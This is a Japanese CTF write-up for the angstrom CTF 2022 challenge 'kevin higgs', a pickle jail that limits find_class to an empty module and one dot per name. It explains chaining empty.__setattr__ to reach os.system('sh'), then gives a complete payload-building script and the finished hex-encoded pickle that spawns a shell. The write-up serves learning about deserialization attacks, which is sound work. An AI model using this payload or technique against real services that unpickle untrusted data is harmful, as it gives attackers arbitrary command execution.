+++
title = "angstrom CTF 2022 - kevin higgs"
date = 2023-03-10

[taxonomies]
tags = ["CTF", "Writeup", "misc", "pickle", "pyjail"]
+++

- 問題ファイル: [challenges/angstromctf/2022/misc/kevinhiggs/app at master · blairsec/challenges](https://github.com/blairsec/challenges/tree/master/angstromctf/2022/misc/kevinhiggs/app)

## TL;DR

- `find_class`に手が加えられたPickle Jail
- `empty`以外のモジュールが使えない上に参照も2階層までしか掘れない
- `empty.__setattr__`を駆使して`empty.c = empty.a.b`のように少しずつ掘っていき`os.system`へ辿り着く

## Prerequisite

- Pickleの仕様
- 基本的なpyjailの方法

## Writeup

次のようなソースコードが与えられる(添付されたDockerfileによれば実行環境は3.10.10)。

```python
#!/usr/local/bin/python3

import pickle
import io
import sys

module = type(__builtins__)
empty = module("empty")
empty.empty = empty
sys.modules["empty"] = empty


class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "empty" and name.count(".") <= 1:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("e-legal")


lepickle = bytes.fromhex(input("Enter hex-encoded pickle: "))
if len(lepickle) > 400:
    print("your pickle is too large for my taste >:(")
else:
    SafeUnpickler(io.BytesIO(lepickle)).load()
```

よくあるPickleを読み込んで`load`してくれる問題だが、独自の`Unpickler`が定義されており、`find_class`に制限が掛かっている。[pickleの実装](https://github.com/python/cpython/blob/3.10/Lib/pickle.py#L1572)を読んでみるとこの関数は`G`バイトコード等が呼ばれた時のモジュールの読み込みで使われるようで、上記コードではそれが空のモジュール`empty`に制限されている。更に使用できるドットの数にも制限があり、`empty.a.b.c`に相当する事は出来ないようになっている。

PythonのJail問題ではメソッドを辿っていって使えるものを探すというのが定番だが、これも例に漏れない。制約付きPickleという事を考慮しなければ、`empty`からシェルを起動する事は可能であり、これは次のようなコードになる。

```python
empty.__class__.__base__.__subclasses__()[125].__init__.__globals__["sys"].modules["os"].system("sh")
```

というわけでこれをPickleで行う事を考える。Pickleでは`R`というバイトコードで関数を実行出来るため(引数はタプルとしてスタックに積んでおく)、読み込みモジュールやドット数に制限が無ければ(手打ちが面倒なだけで)難しくはない。

`empty.__class__.__base__.subclasses__`を`G`バイトコードを用いてスタック上に生成し、`R`で実行する。するとスタックトップには大量のクラスのリストが現れるので`__getitem__`メソッドを同じように`R`で実行する。これを他のメソッドでも繰り返していくことで(辞書の場合は`get`メソッドを用いる)、最終的に`os.system("sh")`が実行される。最終的に次のような実行チェーンとなる。

```python
empty.__class__.__base__.__subclasses__().__getitem__(125).__init__.__globals__.get("sys").modules.get("os").system("sh")
```

考えなくてはならないのは、ドットが1つしか使えないので`find_class("empty", "__class__.__base__")`までしか実行出来ない。つまり、`empty.x.y`までしか要素をスタックに積むことが出来ないということになる。

`empty`は文字通り空のモジュールだが、親クラス(モジュールクラス)が持っているメソッドも使う事が出来るため、そこから使えそうなものを探すと、`empty.__setattr__`が見つかる。これは名前の通りで、キーと値を指定すればキー要素を`empty`に生やしてそこに値が代入される。これで`empty.k = v`という操作が可能になるので、`empty.a = empty.__class__.__base__`相当の事を実行し、`empty.a.__subclass__`としてチェーンを繋げる。これで毎回1つだけなら階層を深くする事が出来るようになったので、後は上野コードを実行するPickleを気合で書く。ちなみに、`find_class`にドット2つを渡して参照をチェーン出来るのはPickleのプロトコルが4以降かららしいので、ペイロードの先頭でそれを明示しておく。

ところで、400バイトまでの制限があるので、代入するメンバの長さを1文字にしたり工夫したが余裕で足りた(284バイト)。

## Code

```python
import pickle
import pickletools
import io
import sys

module = type(__builtins__)
empty = module("empty")
empty.empty = empty
sys.modules["empty"] = empty


class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == "empty" and name.count(".") <= 1:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("e-legal")

payload = b""
payload = pickle.PROTO + b"\x04"

# empty.__class__.__base__.__subclasses__()[125].__init__.__globals__["sys"].modules["os"].system("sh")

# memo[0] = empty.__setattr__
payload += pickle.GLOBAL + b"empty\n" + b"__setattr__\n"
payload += pickle.MEMOIZE
# empty.__setattr__("a", empty.__class__.__base__)
payload += pickle.SHORT_BINSTRING + b"\x01" + b"a"
#   push empty.__class__.__base__
payload += pickle.GLOBAL + b"empty\n" + b"__class__.__base__\n"
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr__("b", empty.a.__subclasses__())
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"b"
#   push empty.a.__subclasses__
payload += pickle.GLOBAL + b"empty\n" + b"a.__subclasses__\n"
#   call empty.a.__subclasses__()
payload += pickle.EMPTY_TUPLE
payload += pickle.REDUCE
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr("c", empty.b.__getitem__(idx))
idx = 125
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"c"
#   push empty.b.__getitem__(idx)
payload += pickle.GLOBAL + b"empty\n" + b"b.__getitem__\n"
payload += pickle.BININT1 + idx.to_bytes(1, "little")
payload += pickle.TUPLE1
payload += pickle.REDUCE
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr("d", empty.c.__init__)
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"d"
#   push empty.c.__init__
payload += pickle.GLOBAL + b"empty\n" + b"c.__init__\n"
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr("e", empty.d.__globals__)
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"e"
#   push empty.d.__globals__
payload += pickle.GLOBAL + b"empty\n" + b"d.__globals__\n"
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr__("f", empty.e.get("sys"))
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"f"
payload += pickle.GLOBAL + b"empty\n" + b"e.get\n"
payload += pickle.STRING + b"'sys'\n"
payload += pickle.TUPLE1
payload += pickle.REDUCE
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr__("g", empty.f.modules)
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"g"
payload += pickle.GLOBAL + b"empty\n" + b"f.modules\n"
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.__setattr__("h", empty.g.get("os"))
payload += pickle.GET + b"0\n"
payload += pickle.SHORT_BINSTRING + b"\x01" + b"h"
payload += pickle.GLOBAL + b"empty\n" + b"g.get\n"
payload += pickle.STRING + b"'os'\n"
payload += pickle.TUPLE1
payload += pickle.REDUCE
#   store
payload += pickle.TUPLE2
payload += pickle.REDUCE
# empty.h.system("sh")
payload += pickle.GLOBAL + b"empty\n" + b"h.system\n"
payload += pickle.STRING + b"'sh'\n"
payload += pickle.TUPLE1
payload += pickle.REDUCE

payload += pickle.STOP
try:
    pickletools.dis(payload)
except ValueError as e:
    if "stack not empty after STOP: " in str(e):
        print(e)  # check types on stack
    else:
        raise e

# debug
# pickled = pickle.loads(payload)
# print(empty.h)
# print(len(payload), pickled)
print(payload.hex())
# 800463656d7074790a5f5f736574617474725f5f0a9455016163656d7074790a5f5f636c6173735f5f2e5f5f626173655f5f0a865267300a55016263656d7074790a612e5f5f737562636c61737365735f5f0a2952865267300a55016363656d7074790a622e5f5f6765746974656d5f5f0a4b7d8552865267300a55016463656d7074790a632e5f5f696e69745f5f0a865267300a55016563656d7074790a642e5f5f676c6f62616c735f5f0a865267300a55016663656d7074790a652e6765740a5327737973270a8552865267300a55016763656d7074790a662e6d6f64756c65730a865267300a55016863656d7074790a672e6765740a53276f73270a8552865263656d7074790a682e73797374656d0a53277368270a85522e

# ================================================================

print("[+] check payload")
# lepickle = bytes.fromhex(input("Enter hex-encoded pickle: "))
lepickle = payload
if len(lepickle) > 400:
    print("your pickle is too large for my taste >:(")
else:
    SafeUnpickler(io.BytesIO(lepickle)).load()
    print("[+] OK")
```

## Flag

ローカルで解いたので無し

## References

- [cpython/pickle.py at 3.10 · python/cpython](https://github.com/python/cpython/blob/3.10/Lib/pickle.py): いつもの
